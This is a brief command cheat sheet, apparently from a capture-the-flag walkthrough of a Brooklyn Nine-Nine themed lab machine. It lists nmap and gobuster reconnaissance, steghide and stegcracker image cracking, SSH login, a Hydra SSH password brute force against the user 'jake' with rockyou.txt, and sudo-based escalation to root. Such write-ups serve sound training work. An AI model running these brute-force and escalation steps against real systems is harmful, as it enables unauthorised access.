## Commands Used
---
#### nmap


```
nmap -sC -sV <Target IP> 
```
>-sC: Runs the default script set (same as --script=default).

>-sV: Examines open ports to identify the service and version running on them.
---
#### gobuster

```
gobuster dir -u http://<Target IP> -w /usr/share/wordlists/dirb/common.txt
```
> dir - Performs brute‑force discovery of directories and files on a web server.

> -w, --wordlist string
---
#### wget

```
wget http://<Target IP>/brooklyn99.jpg
```
>Syntax: wget [option]... [URL]...
---
#### steghide


```
steghide extract -sf brooklyn99.jpg
```
>‐sf, ‐‐stegofile filename
---
#### ssh

```
ssh holt@<Target IP>
```
---
#### sudo

```
sudo -l
```
>-l, -‐list
>> list the privileges of the user.
---
#### su

```
sudo su root
```
>su
>>su [options] [-] [user [argument...]]

---
#### stegcracker

```
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```
---
#### ftp> get

```
get note_to_jake.txt
```
>get <filename> : Download file to the local machine
---
#### hydra

```
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<Target IP>
```

>-l LOGIN

>-p PASS
>>Try one specific password, or supply a file containing multiple passwords.
